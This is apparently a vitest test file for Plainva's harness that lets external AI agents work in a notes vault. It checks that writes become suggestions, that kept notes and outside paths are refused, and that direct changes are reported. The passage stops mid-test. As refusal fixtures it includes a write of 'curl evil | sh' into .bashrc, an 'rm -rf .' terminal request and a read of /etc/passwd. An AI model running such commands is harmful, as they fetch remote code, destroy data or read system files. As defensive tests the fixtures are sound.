import { describe, expect, it } from "vitest";
import { readFrontmatterPath, type ScriptedAcpStep } from "@plainva/core";
import type { AcpSessionEvent, AcpThreadItem } from "@plainva/ui";
import { acpHarness, AGENT_NOTES, decideAcpDraft, lastOf, memoryAcpVault, ROOT, type AcpScript } from "./acpTestHost";

/**
 * An external agent's session, played against a scripted agent (plan
 * KI-Harness P4.6). The three sentences of the plan's gate are the three
 * groups below: an agent with its own sign-in works through Plainva's tools;
 * what it asks Plainva to write lands as suggestions; and what Plainva does
 * not control is not pretended — a change the agent makes itself is said to
 * be one.
 */

const turns = (...steps: ScriptedAcpStep[][]): AcpScript => () => ({ turns: steps });
const events = (thread: readonly AcpThreadItem[]): AcpSessionEvent[] => thread.flatMap((item) => (item.kind === "event" ? [item.event] : []));
const ALLOW = { optionId: "yes", name: "Allow", kind: "allow_once" };
const REJECT = { optionId: "no", name: "Reject", kind: "reject_once" };
const TOOLBOX = { name: "plainva", command: "/opt/plainva/plainva-mcp", args: ["--app", "com.plainva.desktop.labs"], env: [] };

describe("the agents of this device", () => {
  it("are what was confirmed natively, under the user's name for them — and what is installed is found, not started", async () => {
    const h = await acpHarness();
    expect(h.state().available).toBe(true);
    expect(h.state().agents).toEqual([{ id: "geminicli", label: "Gemini CLI", program: "/usr/bin/gemini", args: ["--acp"], known: "Gemini CLI" }]);
    // The dialog of the system showed the file the name means, and every argument.
    expect(h.native.shown).toEqual([{ id: "geminicli", program: "/usr/bin/gemini", args: ["--acp"], text: { title: "Add", message: "Trust it?", confirm: "Add", cancel: "Cancel" } }]);
    // Another known agent is installed and not added: offered, with the command it would be added with. Nothing ran.
    expect(h.state().found).toEqual([{ key: "codex", name: "Codex", program: "/usr/local/bin/codex-acp", args: [] }]);
    expect(h.native.processes).toEqual([]);
  });

  it("are not added where the user says no in the dialog, and an agent of the user's own is one like any other", async () => {
    const h = await acpHarness(undefined, { add: false });
    h.native.confirm = false;
    expect(await h.agents.add("Codex", { program: "codex-acp", args: [] }, { title: "t", message: "m", confirm: "c", cancel: "x" })).toEqual({ ok: false, problem: "declined" });
    expect(h.state().agents).toEqual([]);
    h.native.confirm = true;
    const added = await h.agents.add("My agent", { program: "/home/mara/bin/my-agent", args: ["--stdio"] }, { title: "t", message: "m", confirm: "c", cancel: "x" });
    expect(added.ok).toBe(true);
    expect(h.state().agents).toEqual([{ id: added.ok ? added.id : "", label: "My agent", program: "/home/mara/bin/my-agent", args: ["--stdio"], known: null }]);
    // A second one of the same name gets an id of its own.
    const second = await h.agents.add("My agent", { program: "/home/mara/bin/other", args: [] }, { title: "t", message: "m", confirm: "c", cancel: "x" });
    expect(second.ok && added.ok && second.id !== added.id).toBe(true);
    await h.agents.remove(added.ok ? added.id : "");
    expect(h.state().agents.map((agent) => agent.program)).toEqual(["/home/mara/bin/other"]);
    expect(await h.agents.add("Nothing", { program: "", args: [] }, { title: "t", message: "m", confirm: "c", cancel: "x" })).toEqual({ ok: false, problem: "failed" });
  });

  it("are none where the shell has no native side", async () => {
    const h = await acpHarness(undefined, { add: false });
    h.native.broken = true;
    await h.agents.refresh();
    expect(h.state().available).toBe(false);
    expect(h.state().agents).toEqual([]);
  });
});

describe("an agent with its own sign-in works in the vault", () => {
  it("is started in the vault's folder, told who hosts it and what is offered — and gets Plainva's tools as a program it starts itself", async () => {
    const h = await acpHarness(undefined, { toolbox: TOOLBOX });
    await h.agents.start("geminicli");
    expect(h.native.processes.map((process) => [process.agentId, process.root])).toEqual([["geminicli", ROOT]]);
    const [initialize, session] = h.agent().received;
    expect(initialize?.params).toEqual({ protocolVersion: 1, clientCapabilities: { fs: { readTextFile: true, writeTextFile: true }, terminal: false, auth: { terminal: true } }, clientInfo: { name: "plainva", title: "Plainva", version: "0.9.0" } });
    expect(session?.params).toEqual({ cwd: ROOT, mcpServers: [TOOLBOX] });
    const current = h.state().session!;
    expect(current.phase).toBe("ready");
    expect(current.label).toBe("Gemini CLI");
    expect(current.agentName).toBe("Scripted Agent");
    expect(current.tools).toBe("offered");
  });

  it("gets no tools of Plainva's where they are switched off", async () => {
    const h = await acpHarness();
    await h.agents.start("geminicli");
    expect(h.agent().received[1]?.params).toEqual({ cwd: ROOT, mcpServers: [] });
    expect(h.state().session!.tools).toBe("off");
  });

  it("is started only after a yes in the system's dialog — asked once per agent and folder, and a no leaves nothing behind", async () => {
    const h = await acpHarness();
    h.native.confirmStart = false;
    await h.agents.start("geminicli");
    // The dialog got Plainva's words; the folder and the whole command are the native side's to add below them.
    expect(h.native.startAsked).toEqual([
      { agentId: "geminicli", root: ROOT, text: { title: "ai.agent.start.confirmTitle", message: "ai.agent.start.confirmMessage(Gemini CLI)", confirm: "ai.agent.start.action", cancel: "common.cancel" } },
    ]);
    expect(h.native.processes).toEqual([]);
    // A no is not a failure: no session to show, no line in the vault's log.
    expect(h.state().session).toBeNull();
    await h.settle();
    expect(await h.vault.side.store.sessions()).toEqual([]);

    h.native.confirmStart = true;
    await h.agents.start("geminicli");
    expect(h.state().session!.phase).toBe("ready");
    expect(h.native.startAsked).toHaveLength(2);
    // The yes holds for this agent in this folder: the next session starts without the question.
    await h.agents.end();
    h.agents.dismiss();
    await h.agents.start("geminicli");
    expect(h.native.processes).toHaveLength(2);
    expect(h.native.startAsked).toHaveLength(2);
  });

  it("is not started without a vault, inside an encrypted workspace, or while another session is open", async () => {
    const none = await acpHarness(undefined, { vault: null });
    await none.agents.start("geminicli");
    expect(none.native.processes).toEqual([]);
    expect(none.state().vault).toBe(false);

    const sealed = memoryAcpVault();
    sealed.encrypted = true;
    const h = await acpHarness(undefined, { vault: sealed });
    expect(h.state().encrypted).toBe(true);
    await h.agents.start("geminicli");
    expect(h.native.processes).toEqual([]);

    const open = await acpHarness();
    await open.agents.start("geminicli");
    await open.agents.start("geminicli");
    expect(open.native.processes).toHaveLength(1);
    await open.agents.start("nobody");
    expect(open.native.processes).toHaveLength(1);
  });

  it("is not started while the device is fully local, and a session that runs ends when it becomes so — the agents stay registered", async () => {
    // An agent is a program of another maker with a way out of its own (plan KI-Harness P7, ADR 0030).
    let local = false;
    const h = await acpHarness(undefined, { resting: () => local });
    await h.agents.start("geminicli");
    expect(h.state().session!.phase).toBe("ready");
    local = true;
    h.agents.rest();
    await h.settle();
    expect(h.state().session!.phase).toBe("ended");
    h.agents.dismiss();
    await h.agents.start("geminicli");
    expect(h.native.processes).toHaveLength(1);
    expect(h.state().session).toBeNull();
    expect(h.state().agents.map((agent) => agent.id)).toEqual(["geminicli"]);
    // Switched off again, it starts like before — and without the question the first start answered.
    local = false;
    await h.agents.start("geminicli");
    expect(h.native.processes).toHaveLength(2);
    expect(h.state().session!.phase).toBe("ready");
  });

  it("shows a turn as it happens: the user's words, the agent's text as one piece, its steps, its plan once", async () => {
    const h = await acpHarness(
      turns([
        { say: "Private musing", role: "thought" },
        { plan: [{ content: "Read the plan", priority: "high", status: "in_progress" }] },
        { tool: { toolCallId: "c1", title: "Reading Plan.md", kind: "read", status: "pending", locations: [{ path: `${ROOT}/Projects/Plan.md` }, { path: "/etc/hosts" }] } },
        { toolUpdate: { toolCallId: "c1", status: "completed" } },
        { plan: [{ content: "Read the plan", priority: "high", status: "completed" }] },
        { say: "The plan says " },
        { say: "May." },
      ]),
    );
    await h.agents.start("geminicli");
    await h.agents.send("  What does the plan say?  ");
    const current = h.state().session!;
    expect(current.phase).toBe("ready");
    expect(current.counts.turns).toBe(1);
    expect(current.thread.map((item) => item.kind)).toEqual(["user", "plan", "tool", "agent"]);
    expect(current.thread[0]).toMatchObject({ kind: "user", text: "What does the plan say?", note: null });
    // The plan stands once, as it is now.
    expect(current.thread[1]).toMatchObject({ kind: "plan", entries: [{ content: "Read the plan", priority: "high", status: "completed" }] });
    // A step names the files of the vault by their vault paths, and counts what lies outside.
    expect(current.thread[2]).toMatchObject({ kind: "tool", toolId: "c1", title: "Reading Plan.md", toolKind: "read", status: "completed", files: ["Projects/Plan.md"], outside: 1 });
    expect(current.thread[3]).toMatchObject({ kind: "agent", text: "The plan says May." });
    // What the agent thinks to itself is not part of what was said.
    expect(JSON.stringify(current.thread)).not.toContain("Private musing");
    // The agent got the user's words, and nothing else.
    expect(lastOf(h.agent().received)?.params).toEqual({ sessionId: "sess-1", prompt: [{ type: "text", text: "What does the plan say?" }] });
  });

  it("names the open note where the user wants it — and never a note kept from the cloud", async () => {
    const h = await acpHarness();
    await h.agents.start("geminicli");
    h.vault.active = "Projects/Plan.md";
    await h.agents.send("Summarise this", { note: true });
    expect(lastOf(h.agent().received)?.params).toEqual({ sessionId: "sess-1", prompt: [{ type: "text", text: "Summarise this" }, { type: "resource_link", uri: "file:///home/mara/Vault/Projects/Plan.md", name: "Plan.md" }] });
    expect(h.state().session!.thread.find((item) => item.kind === "user")).toMatchObject({ note: "Projects/Plan.md" });

    h.vault.active = "Health/Results.md";
    await h.agents.send("And this", { note: true });
    expect(lastOf(h.agent().received)?.params).toEqual({ sessionId: "sess-1", prompt: [{ type: "text", text: "And this" }] });
    expect(events(h.state().session!.thread)).toContainEqual({ type: "note-kept", path: "Health/Results.md" });

    // Without the user's wish nothing is named, whatever is open.
    h.vault.active = "Projects/Plan.md";
    await h.agents.send("Just this");
    expect(lastOf(h.agent().received)?.params).toEqual({ sessionId: "sess-1", prompt: [{ type: "text", text: "Just this" }] });
  });

  it("reads an agent as a program that may reach the internet: a note kept from web access is neither named nor handed over", async () => {
    const vault = memoryAcpVault({ ...AGENT_NOTES, "Research/Draft.md": "---\nplainva:\n  ai:\n    web: deny\n---\n# Draft\n\nNot for the web.\n" });
    const h = await acpHarness(turns([{ read: { path: `${ROOT}/Research/Draft.md` } }, { write: { path: `${ROOT}/Research/Draft.md`, content: "# Draft\n\nRewritten.\n" } }]), { vault });
    await h.agents.start("geminicli");
    vault.active = "Research/Draft.md";
    await h.agents.send("Look at this", { note: true });
    expect(lastOf(h.agent().received.filter((message) => message.method === "session/prompt"))?.params).toEqual({ sessionId: "sess-1", prompt: [{ type: "text", text: "Look at this" }] });
    expect(h.agent().answers).toEqual([
      { method: "fs/read_text_file", error: { code: -32602, message: "This note is kept from programs that send elsewhere." } },
      { method: "fs/write_text_file", error: { code: -32602, message: "This note is kept from programs that send elsewhere." } },
    ]);
    expect(events(h.state().session!.thread)).toEqual([
      { type: "note-kept", path: "Research/Draft.md" },
      { type: "refused", what: "read", reason: "kept", path: "Research/Draft.md" },
      { type: "refused", what: "write", reason: "kept", path: "Research/Draft.md" },
    ]);
    expect(JSON.stringify(h.agent().answers)).not.toContain("Not for the web");
    expect(vault.proposed).toEqual([]);
  });

  it("hands a file over through Plainva under the vault's rules, and says in the thread what it refused", async () => {
    const h = await acpHarness(turns([{ read: { path: `${ROOT}/Projects/Plan.md` } }, { read: { path: `${ROOT}/Health/Results.md` } }, { read: { path: "/etc/passwd" } }, { read: { path: `${ROOT}/.agent/policy.yml` } }]));
    await h.agents.start("geminicli");
    await h.agents.send("Read around");
    expect(h.agent().answers).toEqual([
      { method: "fs/read_text_file", result: { content: AGENT_NOTES["Projects/Plan.md"] } },
      { method: "fs/read_text_file", error: { code: -32602, message: "This note is kept from programs that send elsewhere." } },
      { method: "fs/read_text_file", error: { code: -32602, message: "Plainva works with files of the open vault only." } },
      { method: "fs/read_text_file", error: { code: -32602, message: "Plainva does not hand over or change its own folders." } },
    ]);
    const current = h.state().session!;
    expect(current.counts).toMatchObject({ read: 1, refused: 3 });
    expect(events(current.thread)).toEqual([
      { type: "refused", what: "read", reason: "kept", path: "Health/Results.md" },
      // What lies outside the vault is named as the agent named it.
      { type: "refused", what: "read", reason: "outside", path: "/etc/passwd" },
      { type: "refused", what: "read", reason: "hidden", path: `${ROOT}/.agent/policy.yml` },
    ]);
    // The note kept from the cloud was read by Plainva to learn its rule — and went nowhere.
    expect(JSON.stringify(h.agent().answers)).not.toContain("Private.");
  });

  it("puts the agent's question to the user and returns their answer — and a stopped turn makes the question moot", async () => {
    const ask = { ask: { toolCall: { toolCallId: "c7", title: "Run git status", kind: "execute", locations: [{ path: `${ROOT}/Projects/Plan.md` }] }, options: [ALLOW, REJECT] } };
    const h = await acpHarness(turns([ask, { say: "Done." }], [ask, { wait: "cancel" }]));
    await h.agents.start("geminicli");
    const first = h.agents.send("Check");
    await h.settle();
    expect(h.state().session!.phase).toBe("running");
    expect(h.state().session!.question).toEqual({
      title: "Run git status",
      toolKind: "execute",
      files: ["Projects/Plan.md"],
      options: [
        { id: "yes", name: "Allow", kind: "allow_once" },
        { id: "no", name: "Reject", kind: "reject_once" },
      ],
    });
    h.agents.answer("no");
    await first;
    expect(h.agent().answers).toEqual([{ method: "session/request_permission", result: { outcome: { outcome: "selected", optionId: "no" } } }]);
    expect(h.state().session!.question).toBeNull();

    const second = h.agents.send("Again");
    await h.settle();
    expect(h.state().session!.question).not.toBeNull();
    h.agents.stop();
    await second;
    expect(h.agent().answers[1]).toEqual({ method: "session/request_permission", result: { outcome: { outcome: "cancelled" } } });
    expect(h.agent().cancels).toBe(1);
    const current = h.state().session!;
    expect(current.question).toBeNull();
    expect(current.phase).toBe("ready");
    expect(lastOf(events(current.thread))).toEqual({ type: "stopped", reason: "cancelled" });
  });

  it("has no terminal to ask for", async () => {
    const h = await acpHarness(turns([{ request: { method: "terminal/create", params: { sessionId: "sess-1", command: "rm", args: ["-rf", "."] } } }]));
    await h.agents.start("geminicli");
    await h.agents.send("Go");
    expect(h.agent().answers).toEqual([{ method: "terminal/create", error: { code: -32601, message: "Method not found" } }]);
  });
});

describe("what an agent asks Plainva to write lands as a suggestion", () => {
  it("is one round per note when the turn ends, under the agent's id — and the note itself is untouched", async () => {
    const base = AGENT_NOTES["Projects/Plan.md"]!;
    const h = await acpHarness(
      turns([
        // Two writes to the same note in one turn, as an agent that edits step by step makes them.
        { write: { path: `${ROOT}/Projects/Plan.md`, content: base.replace("in May", "in June") } },
        { read: { path: `${ROOT}/Projects/Plan.md` } },
        { write: { path: `${ROOT}/projects/plan.md`, content: base.replace("in May", "in July").replace("gather feedback", "collect feedback") } },
        { say: "I changed the plan." },
      ]),
    );
    await h.agents.start("geminicli");
    const sending = h.agents.send("Move the date");
    await h.settle();
    await sending;
    // The agent was told every write was taken, and read its own text back.
    expect(h.agent().answers).toEqual([
      { method: "fs/write_text_file", result: {} },
      { method: "fs/read_text_file", result: { content: base.replace("in May", "in June") } },
      { method: "fs/write_text_file", result: {} },
    ]);
    // One round, against the note as it is, saying what the last write said.
    expect(h.vault.proposed).toHaveLength(1);
    const round = h.vault.proposed[0]!;
    expect(round.path).toBe("Projects/Plan.md");
    expect(round.base).toBe(base);
    expect(round.author).toEqual({ id: "acp:geminicli", displayName: "ai.agent.author(Gemini CLI)" });
    expect(round.note).toBe("ai.agent.roundNote(Gemini CLI)");
    let text = base;
    for (const chunk of [...round.chunks].sort((a, b) => b.fromA - a.fromA)) text = text.slice(0, chunk.fromA) + chunk.replacement + text.slice(chunk.toA);
    expect(text).toBe(base.replace("in May", "in July").replace("gather feedback", "collect feedback"));
    // Nothing was written: the note is what it was.
    expect(h.vault.files.get("Projects/Plan.md")).toBe(base);
    expect(h.vault.created).toEqual([]);
    const current = h.state().session!;
    expect(current.counts).toMatchObject({ proposed: 1, direct: 0, refused: 0 });
    expect(events(current.thread)).toEqual([{ type: "proposed", path: "Projects/Plan.md", blocks: round.chunks.length, defused: 0 }]);
  });

  it("is laid against the note as it is when the turn ends — the user may have typed meanwhile", async () => {
    const base = AGENT_NOTES["Projects/Plan.md"]!;
    const h = await acpHarness(turns([{ write: { path: `${ROOT}/Projects/Plan.md`, content: base.replace("in May", "in June") } }, { ask: { toolCall: { toolCallId: "c1" }, options: [ALLOW] } }]));
    await h.agents.start("geminicli");
    const sending = h.agents.send("Move the date");
    await h.settle();
    // While the agent waits for an answer, the user edits the note.
    const edited = base.replace("# Plan", "# The plan");
    h.vault.files.set("Projects/Plan.md", edited);
    h.agents.answer("yes");
    await sending;
    expect(h.vault.proposed).toHaveLength(1);
    expect(h.vault.proposed[0]!.base).toBe(edited);
  });

  it("waits as a draft where the note does not exist yet — signed with the agent's id and the user's name for it", async () => {
    const h = await acpHarness(
      turns(
        [
          { write: { path: `${ROOT}/Projects/Summary.md`, content: "# Summary\n\nSee https://example.org/a.\n" } },
          { write: { path: `${ROOT}/Projects/Other.md`, content: "# Other\n" } },
          { read: { path: `${ROOT}/Projects/Summary.md` } },
        ],
        // The second turn: its own text is what the agent reads for a draft that waits, the vault's for a note that was created.
        [{ read: { path: `${ROOT}/Projects/Summary.md` } }, { read: { path: `${ROOT}/Projects/Other.md` } }],
      ),
    );
    await h.agents.start("geminicli");
    await h.agents.send("Write a summary");
    let current = h.state().session!;
    const author = { id: "acp:geminicli", label: "ai.agent.author(Gemini CLI)" };
    expect(h.vault.drafts).toEqual([
      { id: "d-draft-1", author, path: "Projects/Summary.md", content: "# Summary\n\nSee https[://]example.org/a.\n", defused: 1 },
      { id: "d-draft-2", author, path: "Projects/Other.md", content: "# Other\n", defused: 0 },
    ]);
    // The session shows exactly its own drafts, by their ids.
    expect(current.waiting).toEqual(["d-draft-1", "d-draft-2"]);
    expect(events(current.thread)).toEqual([
      { type: "new", path: "Projects/Summary.md" },
      { type: "new", path: "Projects/Other.md" },
    ]);
    // Nothing is in the vault yet; the agent read back what it believes it wrote.
    expect(h.vault.created).toEqual([]);
    expect(lastOf(h.agent().answers)).toEqual({ method: "fs/read_text_file", result: { content: "# Summary\n\nSee https://example.org/a.\n" } });

    // The user decides — on the card in the session or in the list of everything that waits: the session hears of both.
    decideAcpDraft(h, "d-draft-2", "created");
    decideAcpDraft(h, "d-draft-1", "discarded");
    current = h.state().session!;
    expect(current.waiting).toEqual([]);
    expect(current.counts.created).toBe(1);
    expect(events(current.thread).slice(-2)).toEqual([
      { type: "created", path: "Projects/Other.md" },
      { type: "discarded", path: "Projects/Summary.md" },
    ]);
    // What was thrown away is nowhere for the agent either, and what was created is read from the vault.
    await h.agents.send("Read them again");
    expect(h.agent().answers.slice(-2)).toEqual([
      { method: "fs/read_text_file", error: { code: -32002, message: "There is no such file in the vault." } },
      { method: "fs/read_text_file", result: { content: "# Other\n" } },
    ]);
  });

  it("takes the place of its own draft when the agent writes the note again — the card stays the same card", async () => {
    const h = await acpHarness(
      turns([{ write: { path: `${ROOT}/Projects/Summary.md`, content: "# Summary\n\nFirst.\n" } }], [{ write: { path: `${ROOT}/Projects/Summary.md`, content: "# Summary\n\nSecond.\n" } }]),
    );
    await h.agents.start("geminicli");
    await h.agents.send("Write a summary");
    await h.agents.send("Better");
    expect(h.vault.drafts.map((draft) => [draft.id, draft.content])).toEqual([["d-draft-1", "# Summary\n\nSecond.\n"]]);
    const current = h.state().session!;
    expect(current.waiting).toEqual(["d-draft-1"]);
    // Said once: the second write is the same note that waits.
    expect(events(current.thread)).toEqual([{ type: "new", path: "Projects/Summary.md" }]);
  });

  it("hears at once when too many drafts wait — and a draft of its own may still be written again", async () => {
    const vault = memoryAcpVault();
    const h = await acpHarness(
      turns(
        [{ write: { path: `${ROOT}/Projects/Summary.md`, content: "# Summary\n" } }],
        [
          { write: { path: `${ROOT}/Projects/Other.md`, content: "# Other\n" } },
          { write: { path: `${ROOT}/Projects/Summary.md`, content: "# Summary\n\nMore.\n" } },
        ],
      ),
      { vault },
    );
    await h.agents.start("geminicli");
    await h.agents.send("Write a summary");
    vault.draftsFull = true;
    await h.agents.send("And another");
    expect(h.agent().answers.slice(-2)).toEqual([
      { method: "fs/write_text_file", error: { code: -32602, message: "Too many drafts are waiting in Plainva. The user decides about them first." } },
      { method: "fs/write_text_file", result: {} },
    ]);
    expect(vault.drafts.map((draft) => [draft.path, draft.content])).toEqual([["Projects/Summary.md", "# Summary\n\nMore.\n"]]);
    expect(events(h.state().session!.thread).slice(-1)).toEqual([{ type: "refused", what: "write", reason: "waiting", path: "Projects/Other.md" }]);
  });

  it("proposes a value for every property its text changes — in the same round as the passages, each with the hint that says which", async () => {
    const base = AGENT_NOTES["Projects/Notes.md"]!;
    const next = base.replace("tags: [project]", 'tags: ["project", "spec"]\nowner: Anna').replace("for the outline", "for the whole outline");
    const h = await acpHarness(turns([{ write: { path: `${ROOT}/Projects/Notes.md`, content: next } }]));
    await h.agents.start("geminicli");
    await h.agents.send("Tag it");
    expect(h.agent().answers).toEqual([{ method: "fs/write_text_file", result: {} }]);
    expect(h.vault.proposed).toHaveLength(1);
    const round = h.vault.proposed[0]!;
    // The entry that says something else is one block with the hint; a new property is an entry in front of the closing line.
    expect(round.chunks.slice(0, 2)).toEqual([
      { fromA: base.indexOf("tags:"), toA: base.indexOf("tags:") + "tags: [project]".length, replacement: "tags:\n  - project\n  - spec", property: "tags" },
      { fromA: base.indexOf("---\n# Notes"), toA: base.indexOf("---\n# Notes"), replacement: "owner: Anna\n" },
    ]);
    expect(round.chunks.slice(2).every((chunk) => chunk.property === undefined && chunk.fromA > base.indexOf("# Notes"))).toBe(true);
    // Taken together they make a note that says what the agent's text says.
    let text = base;
    for (const chunk of [...round.chunks].reverse()) text = text.slice(0, chunk.fromA) + chunk.replacement + text.slice(chunk.toA);
    expect(readFrontmatterPath(text, ["tags"])).toEqual(["project", "spec"]);
    expect(readFrontmatterPath(text, ["owner"])).toBe("Anna");
    expect(text.endsWith("# Notes\n\nSee https://example.com/spec for the whole outline.\n")).toBe(true);
    // Nothing was written.
    expect(h.vault.files.get("Projects/Notes.md")).toBe(base);
    expect(events(h.state().session!.thread)).toEqual([{ type: "proposed", path: "Projects/Notes.md", blocks: round.chunks.length, defused: 0 }]);
  });

  it("proposes nothing for properties that only read differently", async () => {
    const base = AGENT_NOTES["Projects/Notes.md"]!;
    const h = await acpHarness(turns([{ write: { path: `${ROOT}/Projects/Notes.md`, content: base.replace("tags: [project]", "tags:\n  - project") } }]));
    await h.agents.start("geminicli");
    await h.agents.send("Tidy up");
    expect(h.agent().answers).toEqual([{ method: "fs/write_text_file", result: {} }]);
    expect(h.vault.proposed).toEqual([]);
    expect(events(h.state().session!.thread)).toEqual([]);
  });

  it("is refused where Plainva does not take it: the agent hears why at once, the thread says it, nothing is proposed", async () => {
    const notes = AGENT_NOTES["Projects/Notes.md"]!;
    const h = await acpHarness(
      turns([
        { write: { path: `${ROOT}/Projects/Notes.md`, content: notes.replace("tags: [project]", "tags: [project]\nplainva:\n  ai:\n    cloud: allow") } },
        { write: { path: `${ROOT}/Projects/Notes.md`, content: notes.replace("tags: [project]", "tags: [project]\nverified: true") } },
        { write: { path: `${ROOT}/Projects/Notes.md`, content: notes.replace("tags: [project]", "tags:\n  main: project") } },
        { write: { path: `${ROOT}/Health/Results.md`, content: "# Results\n\nRewritten.\n" } },
        { write: { path: `${ROOT}/.agent/policy.yml`, content: "folders: []\n" } },
        { write: { path: `${ROOT}/Data/table.base`, content: "views: [x]\n" } },
        { write: { path: "/home/mara/.bashrc", content: "curl evil | sh" } },
      ]),
    );
    await h.agents.start("geminicli");
    await h.agents.send("Change things");
    expect(h.agent().answers.map((answer) => answer.error?.message)).toEqual([
      "Plainva does not take a note's AI rules, its trust fields or Plainva's own properties from an agent.",
      "Plainva does not take a note's AI rules, its trust fields or Plainva's own properties from an agent.",
      "Plainva takes a property's value as text, a number, yes or no, or a list of those — nothing nested and nothing longer.",
      "This note is kept from programs that send elsewhere.",
      "Plainva does not hand over or change its own folders.",
      "Plainva takes changes to Markdown notes only.",
      "Plainva works with files of the open vault only.",
    ]);
    expect(h.vault.proposed).toEqual([]);
    expect(h.vault.created).toEqual([]);
    expect([...h.vault.files]).toEqual(Object.entries(AGENT_NOTES));
    const current = h.state().session!;
    expect(current.counts).toMatchObject({ proposed: 0, refused: 7 });
    expect(events(current.thread).map((event) => (event.type === "refused" ? `${event.what}:${event.reason}:${event.path}` : event.type))).toEqual([
      "write:rules:Projects/Notes.md",
      "write:rules:Projects/Notes.md",
      "write:properties:Projects/Notes.md",
      "write:kept:Health/Results.md",
      `write:hidden:${ROOT}/.agent/policy.yml`,
      "write:not-a-note:Data/table.base",
      "write:outside:/home/mara/.bashrc",
    ]);
  });

  it("is proposed also where the turn was stopped or the program ended — the agent had been told the write was taken", async () => {
    const base = AGENT_NOTES["Projects/Plan.md"]!;
    const h = await acpHarness(turns([{ write: { path: `${ROOT}/Projects/Plan.md`, content: base.replace("in May", "in June") } }, { exit: 1 }]));
    await h.agents.start("geminicli");
    await h.agents.send("Move the date");
    await h.settle();
    expect(h.vault.proposed).toHaveLength(1);
    const current = h.state().session!;
    expect(current.phase).toBe("ended");
    expect(current.problem).toEqual({ kind: "exited", code: 1 });
    expect(events(current.thread)).toEqual([{ type: "proposed", path: "Projects/Plan.md", blocks: h.vault.proposed[0]!.chunks.length, defused: 0 }]);
  });

  it("says so where the note's margin did not take the round", async () => {
    const base = AGENT_NOTES["Projects/Plan.md"]!;
    const h = await acpHarness(turns([{ write: { path: `${ROOT}/Projects/Plan.md`, content: base.replace("in May", "in June") } }]));
    h.vault.marginFails = true;
    await h.agents.start("geminicli");
    await h.agents.send("Move the date");
    expect(events(h.state().session!.thread)).toEqual([{ type: "refused", what: "write", reason: "failed", path: "Projects/Plan.md" }]);
    expect(h.state().session!.counts.proposed).toBe(0);
  });
});

describe("what Plainva does not control is said, not hidden", () => {
  it("names a change the agent made itself as one — and does not call a change that went through Plainva direct", async () => {
    const base = AGENT_NOTES["Projects/Plan.md"]!;
    const h = await acpHarness(
      turns([
        // The agent edits a note with its own tool: Plainva only hears about it.
        { tool: { toolCallId: "c1", title: "Edit Notes.md", kind: "edit", status: "in_progress", locations: [{ path: `${ROOT}/Projects/Notes.md` }] } },
        { toolUpdate: { toolCallId: "c1", status: "completed", content: [{ type: "diff", path: `${ROOT}/Projects/Notes.md`, oldText: "a", newText: "b" }] } },
        // The same update again says nothing new.
        { toolUpdate: { toolCallId: "c1", status: "completed" } },
        // An edit that goes through Plainva.
        { tool: { toolCallId: "c2", title: "Edit Plan.md", kind: "edit", status: "in_progress", locations: [{ path: `${ROOT}/Projects/Plan.md` }] } },
        { write: { path: `${ROOT}/Projects/Plan.md`, content: base.replace("in May", "in June") } },
        { toolUpdate: { toolCallId: "c2", status: "completed" } },
        // Reading is no change, and a change outside the vault is not the vault's.
        { tool: { toolCallId: "c3", title: "Read", kind: "read", status: "completed", locations: [{ path: `${ROOT}/Journal/2026-10-07.md` }] } },
        { tool: { toolCallId: "c4", title: "Edit elsewhere", kind: "edit", status: "completed", locations: [{ path: "/tmp/scratch.txt" }] } },
        // A deletion it made itself.
        { tool: { toolCallId: "c5", title: "Remove", kind: "delete", status: "completed", locations: [{ path: `${ROOT}/Data/table.base` }] } },
      ]),
    );
    await h.agents.start("geminicli");
    await h.agents.send("Tidy up");
    const current = h.state().session!;
    expect(events(current.thread)).toEqual([
      { type: "direct", path: "Projects/Notes.md" },
      { type: "direct", path: "Data/table.base" },
      { type: "proposed", path: "Projects/Plan.md", blocks: h.vault.proposed[0]!.chunks.length, defused: 0 },
    ]);
    expect(current.counts).toMatchObject({ direct: 2, proposed: 1 });
  });

  it("remembers per agent which way its changes took on this device, and writes one line per session into the vault's log", async () => {
    const base = AGENT_NOTES["Projects/Plan.md"]!;
    const h = await acpHarness(
      turns([
        { write: { path: `${ROOT}/Projects/Plan.md`, content: base.replace("in May", "in June") } },
        { tool: { toolCallId: "c1", title: "Edit", kind: "edit", status: "completed", locations: [{ path: `${ROOT}/Projects/Notes.md` }] } },
        { read: { path: `${ROOT}/Projects/Notes.md` } },
      ]),
    );
    await h.agents.start("geminicli");
    await h.agents.send("Tidy up");
    await h.agents.end();
    await h.settle();
    expect(h.state().session!.phase).toBe("ended");
    expect(h.state().session!.problem).toBeNull();
    expect(h.agent().stopped).toBe(true);
    expect(h.state().agents[0]!.seen).toEqual({ at: "2026-10-07T10:00:00.000Z", proposed: 1, direct: 1 });
    expect(h.state().sessions).toEqual([{ at: "2026-10-07T10:00:00.000Z", agent: "geminicli", label: "Gemini CLI", turns: 1, read: 1, proposed: 1, created: 0, direct: 1, refused: 0, end: "closed" }]);
    // The log holds how much, never what: no path, no text.
    expect(JSON.stringify([...h.vault.appFiles.files])).not.toMatch(/Plan|Notes|June/);
    h.agents.dismiss();
    expect(h.state().session).toBeNull();
  });
});

describe("the sign-in is the agent's own", () => {
  const terminal = { id: "login", name: "Log in from the terminal", type: "terminal", args: ["login"], env: { AGENT_INTERACTIVE: "1" } };

  it("happens in the agent's own program in a terminal: the same registered program, the agent's arguments added — and the agent is started anew", async () => {
    const h = await acpHarness(({ signedIn }) => ({ needsAuth: !signedIn, authMethods: [terminal] }));
    await h.agents.start("geminicli");
    let current = h.state().session!;
    expect(current.phase).toBe("auth");
    expect(current.authMethods).toEqual([{ id: "login", name: "Log in from the terminal", description: "", kind: "terminal", args: ["login"], env: { AGENT_INTERACTIVE: "1" } }]);
    await h.agents.signIn("login");
    // The terminal was opened for the registered agent, in the vault's folder, with what the agent named — the web view named no program.
    expect(h.native.logins).toEqual([{ agentId: "geminicli", root: ROOT, args: ["login"], env: { AGENT_INTERACTIVE: "1" } }]);
    // No `authenticate` was sent for a terminal method, and a second process took the first one's place.
    expect(h.native.processes).toHaveLength(2);
    expect(h.native.processes[0]!.agent.stopped).toBe(true);
    expect(h.native.processes.flatMap((process) => process.agent.received.map((message) => message.method))).not.toContain("authenticate");
    current = h.state().session!;
    expect(current.phase).toBe("ready");
    expect(current.authProblem).toBeNull();
    expect(current.problem).toBeNull();
  });

  it("says that it was not finished, and what to run where no terminal could be opened", async () => {
    const h = await acpHarness(({ signedIn }) => ({ needsAuth: !signedIn, authMethods: [terminal] }));
    await h.agents.start("geminicli");
    h.native.login = 1;
    await h.agents.signIn("login");
